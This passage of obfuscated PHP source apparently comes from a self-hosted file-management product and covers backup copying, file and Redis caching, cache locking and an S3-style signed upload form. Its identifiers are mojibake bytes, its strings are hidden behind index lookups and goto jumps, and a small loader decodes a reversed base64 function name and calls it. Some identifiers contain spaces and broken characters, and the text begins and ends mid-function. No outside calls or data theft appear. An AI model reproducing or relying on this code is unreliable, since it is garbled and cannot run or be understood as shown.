Backup::set($ÒĞööºú); return !0; } private function backupPath($µìæ¾Õ™) { $ç±µ°Ú­ =& $_SERVER[ì…™Î¶Ï]; $¼¦–«›¾ = $µìæ¾Õ™[$ç±µ°Ú­[32]]; $õ¸ƒÂâÓ = Model($ç±µ°Ú­[745])->get($ç±µ°Ú­[746]); $øÉå™åš = substr(md5($ç±µ°Ú­[747] . $õ¸ƒÂâÓ . $¼¦–«›¾), 0, 8); return "\173\151\157\72{$µìæ¾Õ™[$ç±µ°Ú­[727]]}\x7d\x2f\144\141\164\x61\142\141\x73\x65\x2f\x62\x61\143\153\x75\160\57" . $¼¦–«›¾ . $ç±µ°Ú­[11] . $øÉå™åš; } private function tmpFilesPath() { $ÕÊ¬­™æ =& $_SERVER[ì…™Î¶Ï]; $¡€¤«È¸ = TEMP_FILES; if ($GLOBALS[$ÕÊ¬­™æ[6]][$ÕÊ¬­™æ[90]][$ÕÊ¬­™æ[771]]) { $¡€¤«È¸ = $GLOBALS[$ÕÊ¬­™æ[6]][$ÕÊ¬­™æ[90]][$ÕÊ¬­™æ[771]]; if (!mk_dir($¡€¤«È¸) || !is_writable($¡€¤«È¸) || !IO::mkfile($¡€¤«È¸ . $ÕÊ¬­™æ[772])) { $¡€¤«È¸ = TEMP_FILES; } } return $¡€¤«È¸; } } class BackupFile { public function __construct() { } public function index() { $è­ÈĞ‘‡ = Backup::get(); $»“…İª = $è­ÈĞ‘‡[$_SERVER[ì…™Î¶Ï][288]][$_SERVER[ì…™Î¶Ï][192]][$_SERVER[ì…™Î¶Ï][458]]; $¦•ìÍş» = array($_SERVER[ì…™Î¶Ï][459] => array($_SERVER[ì…™Î¶Ï][782], $»“…İª), $_SERVER[ì…™Î¶Ï][783] => array($_SERVER[ì…™Î¶Ï][326], $è­ÈĞ‘‡[$_SERVER[ì…™Î¶Ï][727]])); $ÎïÔœö = (int) Model($_SERVER[ì…™Î¶Ï][764])->where($¦•ìÍş»)->count($_SERVER[ì…™Î¶Ï][458]); $ôşá®½ = (int) Model($_SERVER[ì…™Î¶Ï][764])->where($¦•ìÍş»)->sum($_SERVER[ì…™Î¶Ï][80]); $Ñü¹À“¡ = new TaskFileTransfer($_SERVER[ì…™Î¶Ï][784], $_SERVER[ì…™Î¶Ï][755], $ÎïÔœö, LNG($_SERVER[ì…™Î¶Ï][756]) . $_SERVER[ì…™Î¶Ï][757] . LNG($_SERVER[ì…™Î¶Ï][785])); $Ñü¹À“¡->task[$_SERVER[ì…™Î¶Ï][738]] = $ôşá®½; $÷ÖÙ—Ø® = array($_SERVER[ì…™Î¶Ï][786] => $ÎïÔœö, $_SERVER[ì…™Î¶Ï][787] => $ôşá®½, $_SERVER[ì…™Î¶Ï][788] => time()); Backup::set($÷ÖÙ—Ø®); $†´òÀ×È = !0; $ºô´à© = $this->storeIds(); $±¬Ã”® = 1; $«Ä¸º…† = 1000; $ì¤ÙÔ— = $Ìôè²ïö = 0; $˜ÁÇâíù = array(); $åÇâä¯¦ = $öµ¯„ª = 0; do { $‚‡ñ‰¢ = $_SERVER[ì…™Î¶Ï][789]; $áÖô®Øà = Model($_SERVER[ì…™Î¶Ï][764])->where($¦•ìÍş»)->field($‚‡ñ‰¢)->order($_SERVER[ì…™Î¶Ï][790])->selectPage($«Ä¸º…†, $±¬Ã”®); $îß—¯ï² = !empty($áÖô®Øà[$_SERVER[ì…™Î¶Ï][364]]) ? $áÖô®Øà[$_SERVER[ì…™Î¶Ï][364]] : array(); foreach ($îß—¯ï² as $‹€îáÅÑ) { if (!$this->_fileExist($‹€îáÅÑ, $˜ÁÇâíù, $ºô´à©)) { $ÎïÔœö -= 1; $ôşá®½ -= (int) $‹€îáÅÑ[$_SERVER[ì…™Î¶Ï][80]]; write_log("\x66\151\154\145\x20\x6e\x6f\164\40\145\x78\151\x73\x74\x2e\x66\151\154\145\x49\x44\x3a{$‹€îáÅÑ[$_SERVER[ì…™Î¶Ï][458]]}\x2c\x20\x70\x61\164\150\72{$‹€îáÅÑ[$_SERVER[ì…™Î¶Ï][78]]}", $_SERVER[ì…™Î¶Ï][791]); continue; } $Ê¸øÍŠ° = $‹€îáÅÑ[$_SERVER[ì…™Î¶Ï][78]]; $ĞïÎĞô” = "\173\151\157\72{$è­ÈĞ‘‡[$_SERVER[ì…™Î¶Ï][727]]}\175" . substr($Ê¸øÍŠ°, strlen("\173\x69\x6f\72{$‹€îáÅÑ[$_SERVER[ì…™Î¶Ï][792]]}\175")); if (IO::exist($ĞïÎĞô”)) { $Ñü¹À“¡->updateFileEnd($‹€îáÅÑ[$_SERVER[ì…™Î¶Ï][32]], $‹€îáÅÑ[$_SERVER[ì…™Î¶Ï][80]]); } else { $ĞïÎĞô” = get_path_father($ĞïÎĞô”); IO::mkdir($ĞïÎĞô”); if (!IO::copy($Ê¸øÍŠ°, $ĞïÎĞô”, $_SERVER[ì…™Î¶Ï][793])) { write_log($_SERVER[ì…™Î¶Ï][794] . $Ê¸øÍŠ° . $_SERVER[ì…™Î¶Ï][778] . $ĞïÎĞô” . $_SERVER[ì…™Î¶Ï][527], $_SERVER[ì…™Î¶Ï][755]); $†´òÀ×È = !1; break; } } $»“…İª = $‹€îáÅÑ[$_SERVER[ì…™Î¶Ï][458]]; $Ìôè²ïö += 1; $ì¤ÙÔ— += $‹€îáÅÑ[$_SERVER[ì…™Î¶Ï][80]]; $öµ¯„ª += 1; $åÇâä¯¦ += $‹€îáÅÑ[$_SERVER[ì…™Î¶Ï][80]]; if ($ì¤ÙÔ— >= 1024 * 1024 * 100) { $÷ÖÙ—Ø® = array($_SERVER[ì…™Î¶Ï][795] => $»“…İª, $_SERVER[ì…™Î¶Ï][796] => $öµ¯„ª, $_SERVER[ì…™Î¶Ï][797] => $åÇâä¯¦); Backup::set($÷ÖÙ—Ø®); $ì¤ÙÔ— = $Ìôè²ïö = 0; } } $È£À°€ = count($îß—¯ï²); $±¬Ã”®++; } while ($È£À°€ == $«Ä¸º…†); $Ñü¹À“¡->end(); $÷ÖÙ—Ø® = array($_SERVER[ì…™Î¶Ï][798] => 1, $_SERVER[ì…™Î¶Ï][487] => time(), $_SERVER[ì…™Î¶Ï][750] => 1, $_SERVER[ì…™Î¶Ï][795] => $»“…İª, $_SERVER[ì…™Î¶Ï][787] => $ôşá®½, $_SERVER[ì…™Î¶Ï][786] => $ÎïÔœö, $_SERVER[ì…™Î¶Ï][799] => time()); if ($Ìôè²ïö) { $÷ÖÙ—Ø®[$_SERVER[ì…™Î¶Ï][796]] = $öµ¯„ª; $÷ÖÙ—Ø®[$_SERVER[ì…™Î¶Ï][797]] = $åÇâä¯¦; } Backup::set($÷ÖÙ—Ø®); $this->_fileFilter($˜ÁÇâíù); return !0; } private function _fileExist($°ùİÎü, &$ÖÑÒ¦‘º, $„½ÅêÉÉ) { $Œ½Ä¶²¾ =& $_SERVER[ì…™Î¶Ï]; $˜È³¤® = $°ùİÎü[$Œ½Ä¶²¾[78]]; if (in_array($°ùİÎü[$Œ½Ä¶²¾[458]], $ÖÑÒ¦‘º)) { return !1; } if (!in_array($°ùİÎü[$Œ½Ä¶²¾[792]], $„½ÅêÉÉ)) { return !1; } if (IO::exist($˜È³¤®)) { return !0; } $ŸèÒçµ¸ = get_path_father($˜È³¤®); if (IO::exist($ŸèÒçµ¸)) { $ÖÑÒ¦‘º[] = $°ùİÎü[$Œ½Ä¶²¾[458]]; return !1; } $³®• = array($Œ½Ä¶²¾[792] => $°ùİÎü[$Œ½Ä¶²¾[792]], $Œ½Ä¶²¾[78] => array($Œ½Ä¶²¾[378], "{$ŸèÒçµ¸}\45")); $§â×É™Å = Model($Œ½Ä¶²¾[764])->where($³®•)->field($Œ½Ä¶²¾[459])->select(); $ÖÑÒ¦‘º = array_merge($ÖÑÒ¦‘º, array_to_keyvalue($§â×É™Å, $Œ½Ä¶²¾[12], $Œ½Ä¶²¾[458])); return !1; } private function _fileFilter($ı…È›ÅÂ) { $ŸŸôüŒ‹ =& $_SERVER[ì…™Î¶Ï]; if (empty($ı…È›ÅÂ)) { return; } $ä©®©Ï’ = array($ŸŸôüŒ‹[458] => array($ŸŸôüŒ‹[7], array_unique($ı…È›ÅÂ))); $Œñó«ßë = Model($ŸŸôüŒ‹[800])->where($ä©®©Ï’)->field($ŸŸôüŒ‹[394])->select(); foreach ($Œñó«ßë as $•—¾›ÖÄ) { Model($ŸŸôüŒ‹[800])->remove($•—¾›ÖÄ[$ŸŸôüŒ‹[394]], !1); } } private function storeIds() { $†º’È—Õ =& $_SERVER[ì…™Î¶Ï]; $×’ŸÙ¬Ò = Model($†º’È—Õ[742])->listData(); $ÌŒˆ›§ = array(); $Øéº“ô = $GLOBALS[$†º’È—Õ[6]][$†º’È—Õ[90]][$†º’È—Õ[801]]; foreach ($×’ŸÙ¬Ò as $¸Êó¼ÈÅ) { $¶ô­ÉíÕ = strtolower($¸Êó¼ÈÅ[$†º’È—Õ[96]]); if (!isset($Øéº“ô[$¶ô­ÉíÕ])) { continue; } $¸¨»ÂÏç = $†º’È—Õ[74] . (isset($Øéº“ô[$¶ô­ÉíÕ]) ? $Øéº“ô[$¶ô­ÉíÕ] : ucfirst($¶ô­ÉíÕ)); if (!class_exists($¸¨»ÂÏç)) { continue; } $ÌŒˆ›§[] = $¸Êó¼ÈÅ[$†º’È—Õ[392]]; } return $ÌŒˆ›§; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $µ•Ÿîú =& $_SERVER[ì…™Î¶Ï]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $÷ÒÊˆñ = $GLOBALS[$µ•Ÿîú[6]][$µ•Ÿîú[344]]; $Ğ‹Û¶™Í = $÷ÒÊˆñ[$÷ÒÊˆñ[$µ•Ÿîú[802]]]; $Í·¬Ç = $÷ÒÊˆñ[$µ•Ÿîú[803]]; switch ($÷ÒÊˆñ[$µ•Ÿîú[802]]) { case $µ•Ÿîú[21]: self::$handle = Model($µ•Ÿîú[804]); break; case $µ•Ÿîú[805]: self::$handle = new CacheRedis($Ğ‹Û¶™Í, $Í·¬Ç); break; case $µ•Ÿîú[806]: self::$handle = new CacheMemcached($Ğ‹Û¶™Í, $Í·¬Ç); break; case $µ•Ÿîú[192]: self::$handle = new CacheFile($Ğ‹Û¶™Í, $Í·¬Ç); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($úÓÁºÉæ) { if (is_array($úÓÁºÉæ) || is_object($úÓÁºÉæ)) { $úÓÁºÉæ = json_encode($úÓÁºÉæ); } $úÓÁºÉæ = rawurlencode($úÓÁºÉæ); return md5(KOD_SITE_ID . $_SERVER[ì…™Î¶Ï][11] . $úÓÁºÉæ); } public static function get($¹¯Ü•¢¸, $êù“©£Ë = false) { $‚ Ü’ĞØ = self::key($¹¯Ü•¢¸); if ($êù“©£Ë) { return unserialize(self::init()->get($‚ Ü’ĞØ)); } if (!isset(self::$memoryCache[$‚ Ü’ĞØ])) { $¹ôçŠÍæ = self::init()->get($‚ Ü’ĞØ); self::$memoryCache[$‚ Ü’ĞØ] = unserialize($¹ôçŠÍæ); } return self::$memoryCache[$‚ Ü’ĞØ]; } public static function set($È‘Ëâ…, $õï·ÛÔ, $½Ôˆö¥Ö = false) { $íˆàÜÛå = self::key($È‘Ëâ…); if (isset(self::$memoryCache[$íˆàÜÛå]) && self::$memoryCache[$íˆàÜÛå] === $õï·ÛÔ) { return !0; } if ($½Ôˆö¥Ö === 0) { self::$memoryCache[$íˆàÜÛå] = $õï·ÛÔ; return !0; } CacheLock::lock($È‘Ëâ…); $Å¼İœÎ = self::init()->set($íˆàÜÛå, serialize($õï·ÛÔ), $½Ôˆö¥Ö); self::$memoryCache[$íˆàÜÛå] = $õï·ÛÔ; CacheLock::unlock($È‘Ëâ…); return $Å¼İœÎ; } public static function getCall($ÎÁÑ¹Ì, $±­ƒ¥â±, $¥È¨™ç, $¬±ÉÓ–Ñ = array()) { $şÔôÙ¶ =& $_SERVER[ì…™Î¶Ï]; $…œˆîÍ = self::get($ÎÁÑ¹Ì); if ($…œˆîÍ || $…œˆîÍ === $şÔôÙ¶[12]) { return $…œˆîÍ; } $…œˆîÍ = call_user_func_array($¥È¨™ç, $¬±ÉÓ–Ñ); $…œˆîÍ = $…œˆîÍ ? $…œˆîÍ : $şÔôÙ¶[12]; self::set($ÎÁÑ¹Ì, $…œˆîÍ, $±­ƒ¥â±); return $…œˆîÍ; } public static function remove($…‹Ï¨ó) { $ëÁ­Šù³ = self::key($…‹Ï¨ó); unset(self::$memoryCache[$ëÁ­Šù³]); self::clearTimeout(); CacheLock::lock($…‹Ï¨ó); $ş·°Óö£ = self::init()->remove($ëÁ­Šù³); CacheLock::unlock($…‹Ï¨ó); return $ş·°Óö£; } public static function removeMemory($ÇôÄº©) { $œü™ùáã = self::key($ÇôÄº©); unset(self::$memoryCache[$œü™ùáã]); } public static function clearMemory($ÌÑÓ³Íå = false) { if ($ÌÑÓ³Íå) { $ÌÑÓ³Íå = self::key($ÌÑÓ³Íå); unset(self::$memoryCache[$ÌÑÓ³Íå]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ì…™Î¶Ï][807])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ì…™Î¶Ï][808])) { self::init()->clearTimeout(); } } } goto D÷äñ¢óŞ ; e”Ç‘é·«: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÌÁ’›¶–) { $this->pathParse = $ÌÁ’›¶–; } protected function infoParse($Å‚”€‚í, $¶öô ä» = false) { $‰òä• =& $_SERVER[ì…™Î¶Ï]; return Action($‰òä•[1149])->sharePathInfo($this->pathParse[$‰òä•[78]], !0, $¶öô ä»); } public function listPath($Çµú·ñ, $÷Èğ ¸Ó = false) { $˜Ÿè°®è =& $_SERVER[ì…™Î¶Ï]; $òóˆÙîü = IO::listPath($Çµú·ñ, $÷Èğ ¸Ó); if (!$òóˆÙîü) { return $òóˆÙîü; } if (is_array($òóˆÙîü[$˜Ÿè°®è[1310]])) { $Å‹ØàèŒ = Action($˜Ÿè°®è[1321])->parsePathChildren($òóˆÙîü[$˜Ÿè°®è[1310]], array($˜Ÿè°®è[413] => $Çµú·ñ)); $òóˆÙîü[$˜Ÿè°®è[1310]] = Action($˜Ÿè°®è[1149])->shareItemInfo($Å‹ØàèŒ); } foreach ($òóˆÙîü as $ı‘£Ëó¯ => $¿ºôëùÉ) { if (!in_array($ı‘£Ëó¯, array($˜Ÿè°®è[76], $˜Ÿè°®è[77]))) { continue; } foreach ($¿ºôëùÉ as $å—İ·éÍ => $Å‹ØàèŒ) { $Å‹ØàèŒ = Action($˜Ÿè°®è[1321])->parsePathChildren($Å‹ØàèŒ, array($˜Ÿè°®è[413] => $Çµú·ñ)); $òóˆÙîü[$ı‘£Ëó¯][$å—İ·éÍ] = Action($˜Ÿè°®è[1149])->shareItemInfo($Å‹ØàèŒ); } } return $òóˆÙîü; } public function listAll($Ûãı—”) { $ŠöÏ”éÅ =& $_SERVER[ì…™Î¶Ï]; $«üˆüôÇ = IO::listAll($Ûãı—”); foreach ($«üˆüôÇ as &$ƒê§”±Ï) { $¹İµÜ´ = IO::info($ƒê§”±Ï[$ŠöÏ”éÅ[78]]); $¹İµÜ´ = is_array($¹İµÜ´) ? $¹İµÜ´ : array(); $ƒê§”±Ï = array_merge($¹İµÜ´, $ƒê§”±Ï); $ƒê§”±Ï[$ŠöÏ”éÅ[87]] = Action($ŠöÏ”éÅ[1149])->shareItemInfo($ƒê§”±Ï); } unset($ƒê§”±Ï); return $«üˆüôÇ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($áçîµ€Ê) { parent::__construct($áçîµ€Ê); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($â±šŞ½ƒ) { parent::__construct($â±šŞ½ƒ); $this->signatureVersion($_SERVER[ì…™Î¶Ï][211]); } public function uploadFormData($Ã§Ãú¹, $Ì®î·ß = 3600) { $ç¸ç˜öÕ =& $_SERVER[ì…™Î¶Ï]; $œ¼İ’ş = $ç¸ç˜öÕ[191]; $ÎıÓµáè = $ç¸ç˜öÕ[1322]; $€ÏÍ“¢Ú = $ç¸ç˜öÕ[62]; $Ùı¼Ã½š = gmdate($ç¸ç˜öÕ[1323]); $®Ú²ËÌ = gmdate($ç¸ç˜öÕ[726]); $ÒöŒıœ‰ = $ç¸ç˜öÕ[1324]; $ÍÓé‹ÒÆ = $Ì®î·ß . $ç¸ç˜öÕ[12]; $¸ ìú… = $ç¸ç˜öÕ[1284]; $Á€á›¤ã = array($this->accessKey, $®Ú²ËÌ, $this->region, $€ÏÍ“¢Ú, $ÒöŒıœ‰); $û¬‚úé = implode($ç¸ç˜öÕ[8], $Á€á›¤ã); $ŒŠ’·ÄŒ = array($ç¸ç˜öÕ[1286] => gmdate($ç¸ç˜öÕ[1285], strtotime($ç¸ç˜öÕ[1325])), $ç¸ç˜öÕ[1287] => array(array($ç¸ç˜öÕ[1289] => $this->bucket), array($ç¸ç˜öÕ[1288] => $œ¼İ’ş), array($ç¸ç˜öÕ[1290], $ç¸ç˜öÕ[1291], $ç¸ç˜öÕ[12]), array($ç¸ç˜öÕ[1290], $ç¸ç˜öÕ[1326], $ç¸ç˜öÕ[12]), array($ç¸ç˜öÕ[1290], $ç¸ç˜öÕ[1327], $ç¸ç˜öÕ[12]), array($ç¸ç˜öÕ[1292] => $¸ ìú…), array($ç¸ç˜öÕ[1328] => $û¬‚úé), array($ç¸ç˜öÕ[1329] => $ÎıÓµáè), array($ç¸ç˜öÕ[1330] => $Ùı¼Ã½š), array($ç¸ç˜öÕ[1331] => $ÍÓé‹ÒÆ))); $âŞÙœÅ˜ = base64_encode(json_encode($ŒŠ’·ÄŒ)); $ÉùşŸ› = hash_hmac($ç¸ç˜öÕ[1332], $®Ú²ËÌ, $ç¸ç˜öÕ[1333] . $this->secret, !0); $à”Èæ’Û = hash_hmac($ç¸ç˜öÕ[1332], $this->region, $ÉùşŸ›, !0); $äÈ‡¨Ş = hash_hmac($ç¸ç˜öÕ[1332], $€ÏÍ“¢Ú, $à”Èæ’Û, !0); $ğºµ¡¾á = hash_hmac($ç¸ç˜öÕ[1332], $ÒöŒıœ‰, $äÈ‡¨Ş, !0); $ıŒ‹µ½Û = hash_hmac($ç¸ç˜öÕ[1332], $âŞÙœÅ˜, $ğºµ¡¾á); $Î¸ì–·€ = array($ç¸ç˜öÕ[210] => $ç¸ç˜öÕ[12], $ç¸ç˜öÕ[1334] => $ç¸ç˜öÕ[12], $ç¸ç˜öÕ[1288] => $œ¼İ’ş, $ç¸ç˜öÕ[1292] => $¸ ìú…, $ç¸ç˜öÕ[1296] => $âŞÙœÅ˜, $ç¸ç˜öÕ[1335] => $û¬‚úé, $ç¸ç˜öÕ[1336] => $ÎıÓµáè, $ç¸ç˜öÕ[1337] => $Ùı¼Ã½š, $ç¸ç˜öÕ[1338] => $ÍÓé‹ÒÆ, $ç¸ç˜öÕ[1339] => $ıŒ‹µ½Û, $ç¸ç˜öÕ[174] => $this->getHost()); return $Î¸ì–·€; } } goto a¡‘§„çÈÒ; D÷äñ¢óŞ : class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ßşµ‰ƒ, $à±€çˆ) { $Ô¤ÃÁşË =& $_SERVER[ì…™Î¶Ï]; $this->cachePath = $ßşµ‰ƒ[$Ô¤ÃÁşË[78]]; $this->prefix = $Ô¤ÃÁşË[809]; $this->cacheTime = $à±€çˆ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ëÎ‘³ç) { $İ’¶šµÈ =& $_SERVER[ì…™Î¶Ï]; $ëÎ‘³ç = str_replace(array($İ’¶šµÈ[810], $İ’¶šµÈ[98], $İ’¶šµÈ[73]), $İ’¶šµÈ[811], $ëÎ‘³ç); return $this->cachePath . $İ’¶šµÈ[812] . $ëÎ‘³ç . $İ’¶šµÈ[813]; } public function set($àíŒİ’ë, $ºèÊ×¬ı, $ôñÏ°Û¤ = false) { $–ñ½Ìğ… = $this->getFile($àíŒİ’ë); if (file_put_contents($–ñ½Ìğ…, $this->prefix . $ºèÊ×¬ı, LOCK_EX)) { @touch($–ñ½Ìğ…, intval(time() + $ôñÏ°Û¤)); clearstatcache(); return !0; } @unlink($–ñ½Ìğ…); return !1; } public function get($†³‚õşŸ) { $•»ÙÏì = $this->getFile($†³‚õşŸ); if (file_exists($•»ÙÏì) && filemtime($•»ÙÏì) < time()) { @unlink($•»ÙÏì); return !1; } $¡³·‹÷ = @file_get_contents($•»ÙÏì); return substr($¡³·‹÷, strlen($this->prefix)); } public function remove($£½Ä‡æç) { $ßÍšúª¹ = $this->getFile($£½Ä‡æç); return @unlink($ßÍšúª¹); } public function deleteAll() { $Æ­¾ç =& $_SERVER[ì…™Î¶Ï]; $†ŠÑ«úÃ = scandir($this->cachePath); foreach ($†ŠÑ«úÃ as $°çÒ¥ªé) { $Ê¥ë‘è = $this->cachePath . $°çÒ¥ªé; if (strpos($Ê¥ë‘è, $Æ­¾ç[813]) && strpos($Ê¥ë‘è, $Æ­¾ç[814])) { @unlink($Ê¥ë‘è); } } } public function clearTimeout() { $“Í‚¡ƒö =& $_SERVER[ì…™Î¶Ï]; $™ÚÚ“Û = scandir($this->cachePath); foreach ($™ÚÚ“Û as $¶ûÍ‰¨Á) { $Æ®†ûı¡ = $this->cachePath . $¶ûÍ‰¨Á; if (strpos($Æ®†ûı¡, $“Í‚¡ƒö[813]) && strpos($Æ®†ûı¡, $“Í‚¡ƒö[814]) && filemtime($Æ®†ûı¡) < time()) { @unlink($Æ®†ûı¡); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $¼î«€øØ =& $_SERVER[ì…™Î¶Ï]; if (self::$handle) { return self::$handle; } $Ò„ÁÎÇ = $GLOBALS[$¼î«€øØ[6]][$¼î«€øØ[344]]; self::$timeout = $Ò„ÁÎÇ[$¼î«€øØ[815]] ? $Ò„ÁÎÇ[$¼î«€øØ[815]] : 10; $ˆŸÎì « = _get($GLOBALS[$¼î«€øØ[6]], $¼î«€øØ[816]); $ù™ØÜ´Å = $Ò„ÁÎÇ[$¼î«€øØ[802]] ? $Ò„ÁÎÇ[$¼î«€øØ[802]] : $¼î«€øØ[192]; if ($ù™ØÜ´Å == $¼î«€øØ[21] && $ˆŸÎì « == $¼î«€øØ[13]) { $ù™ØÜ´Å = $¼î«€øØ[192]; } switch ($ù™ØÜ´Å) { case $¼î«€øØ[805]: self::$handle = new CacheLockRedis(); break; case $¼î«€øØ[806]: self::$handle = new CacheLockMemcached(); break; case $¼î«€øØ[21]: self::$handle = new CacheLockDatabase(); break; case $¼î«€øØ[192]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($¼î«€øØ[817], $¼î«€øØ[818]); } return self::$handle; } private static function key($º×Ëß°ˆ) { return $_SERVER[ì…™Î¶Ï][819] . Cache::key($º×Ëß°ˆ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ûê–É = '') { self::$errorMsg = $ûê–É; } public static function lockGlobal($“È¾ğà, $—Şª´°Š) { return self::lock($“È¾ğà, $—Şª´°Š, !0); } public static function lock($ä¾Ùº£, $”Ü¡ŞÀ® = false, $øÍ×Ã¼Ò = false) { $˜’²®íš =& $_SERVER[ì…™Î¶Ï]; $Éëü˜‰ = self::init(); $ªß¼¥ßŒ = self::key($ä¾Ùº£); $”Ü¡ŞÀ® = $”Ü¡ŞÀ® ? $”Ü¡ŞÀ® : self::$timeout; $Û¦¦ÈïÜ = $Éëü˜‰->lock($ªß¼¥ßŒ, $”Ü¡ŞÀ®); $„ÄÀ±ï = timeFloat(); if (!$Û¦¦ÈïÜ) { $ÕÏªØÏƒ = "\x6c\157\143\x6b\x20\145\162\162\157\162\x3b\x6b\145\x79\75{$ä¾Ùº£}\73\x74\151\x6d\145\75{$”Ü¡ŞÀ®}\x3b" . self::$errorMsg . $˜’²®íš[71] . get_caller_msg(); $Ä•€¬®÷ = LNG($˜’²®íš[820]) . "\50{$”Ü¡ŞÀ®}\x73\x29\x2e" . LNG($˜’²®íš[821]); $Ä•€¬®÷ .= $˜’²®íš[822]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Ä•€¬®÷ = $Ä•€¬®÷ . $˜’²®íš[823] . self::$errorMsg; } write_log($ÕÏªØÏƒ, $˜’²®íš[818]); show_json($Ä•€¬®÷, !1); } if (!$øÍ×Ã¼Ò) { self::$lockItem[$ªß¼¥ßŒ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $à†ªÇâò = number_format(timeFloat() - $„ÄÀ±ï, 3); write_log($˜’²®íš[824] . $ä¾Ùº£ . $˜’²®íš[825] . $à†ªÇâò, $˜’²®íš[818]); } return $Û¦¦ÈïÜ; } public static function lockGet($´ıëÜ¤İ) { $·ÍÑ‡˜Ú = self::key($´ıëÜ¤İ); if (self::$lockItem[$·ÍÑ‡˜Ú]) { return self::$lockItem[$·ÍÑ‡˜Ú]; } return self::init()->lockGet($·ÍÑ‡˜Ú); } public static function unlock($ ›±¬Ãƒ) { $÷šãŒú =& $_SERVER[ì…™Î¶Ï]; $¾¾Øİ¥¨ = self::key($ ›±¬Ãƒ); self::$lockItem[$¾¾Øİ¥¨] = null; self::init()->unlock($¾¾Øİ¥¨); if (GLOBAL_DEBUG_LOG_ALL) { write_log($÷šãŒú[826] . $ ›±¬Ãƒ, $÷šãŒú[818]); } return; } public static function unlockRuntime() { $‰²©ô´ =& $_SERVER[ì…™Î¶Ï]; $¶ƒ§‚â­ = self::init(); $­„±áÇß = !1; foreach (self::$lockItem as $Ü‘›í‘æ => $ó·´¼ ) { if (!$ó·´¼ ) { continue; } $¶ƒ§‚â­->unlock($Ü‘›í‘æ); if (!$­„±áÇß) { $­„±áÇß = !0; write_log($‰²©ô´[827] . $Ü‘›í‘æ . $‰²©ô´[71] . get_caller_msg(), $‰²©ô´[818]); continue; } write_log($‰²©ô´[827] . $Ü‘›í‘æ, $‰²©ô´[818]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $à”àŞÄæ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($‰²©ô´[828] . $à”àŞÄæ . $‰²©ô´[829] . ACTION, $‰²©ô´[818]); } } public static function fileLock($•®­Â“é) { $¤“ÎÜ• =& $_SERVER[ì…™Î¶Ï]; if (!$GLOBALS[$¤“ÎÜ•[830]]) { $GLOBALS[$¤“ÎÜ•[830]] = array(); } $GLOBALS[$¤“ÎÜ•[830]][$•®­Â“é] = !1; $¢¾Õ×˜ = fopen(DATA_PATH . $•®­Â“é . $¤“ÎÜ•[831], $¤“ÎÜ•[832]); if (!$¢¾Õ×˜) { return !1; } $GLOBALS[$¤“ÎÜ•[830]][$•®­Â“é] = $¢¾Õ×˜; if (flock($¢¾Õ×˜, LOCK_EX)) { return !0; } self::unlock($•®­Â“é); show_json($¤“ÎÜ•[833], !1); return !1; } public static function fileUnlock($»±“Û†ê) { $‰Ìßƒú =& $_SERVER[ì…™Î¶Ï]; $„…¬¤ıñ = $GLOBALS[$‰Ìßƒú[830]][$»±“Û†ê]; if (!$„…¬¤ıñ) { return; } $GLOBALS[$‰Ìßƒú[830]][$»±“Û†ê] = !1; flock($„…¬¤ıñ, LOCK_UN); fclose($„…¬¤ıñ); } public static function fileUnlockAll() { $µ÷¨ƒÈ =& $_SERVER[ì…™Î¶Ï]; if (!$GLOBALS[$µ÷¨ƒÈ[830]]) { return; } foreach ($GLOBALS[$µ÷¨ƒÈ[830]] as $Õäü— => $¿şø î) { if (!$¿şø î) { continue; } $GLOBALS[$µ÷¨ƒÈ[830]][$Õäü—] = !1; flock($¿şø î, LOCK_UN); fclose($¿şø î); } $GLOBALS[$µ÷¨ƒÈ[830]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto FëÙ´Õ¯; Eƒİµ•ºš: define($_SERVER[ì…™Î¶Ï][595], $_SERVER[ì…™Î¶Ï][596]); $dgisjqryec = $_SERVER[ì…™Î¶Ï][597]; if (strlen($dgisjqryec) < $_SERVER[ì…™Î¶Ï][598]) { die; } goto eÎçƒÔ¥ø³; cÁ£ÌÆ„: $fileSize = strrev(base64_decode($_SERVER[ ¼ÕÆÇ][0])); function binCheckNeq($µ¶Â›¿¼, $ÑÑ´“çÔ) { return $µ¶Â›¿¼ != $ÑÑ´“çÔ; } $_SERVER[$_SERVER[ ¼ÕÆÇ][1]] = $fileSize($_SERVER[$_SERVER[ ¼ÕÆÇ][2]]); goto AÏêŒ©¨öì; fµİ—‰—¿à: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $ôÄæŠÕ§ =& $_SERVER[ì…™Î¶Ï]; $this->objectDriver = array($ôÄæŠÕ§[60], $ôÄæŠÕ§[61], $ôÄæŠÕ§[62], $ôÄæŠÕ§[63], $ôÄæŠÕ§[64], $ôÄæŠÕ§[65], $ôÄæŠÕ§[66], $ôÄæŠÕ§[67], $ôÄæŠÕ§[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($øÄ‚ş‰Ú) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($øÄ‚ş‰Ú, $_SERVER[ì…™Î¶Ï][8]); } return $øÄ‚ş‰Ú; } public function iconvApp($Ôôã¡Ü±) { return $Ôôã¡Ü±; } public function iconvSystem($ò–ıÅ±) { return $ò–ıÅ±; } public function iconvTo($¼ıÎ§‘À, $€½øÄÚ¾, $Î‚´Ğ‘) { 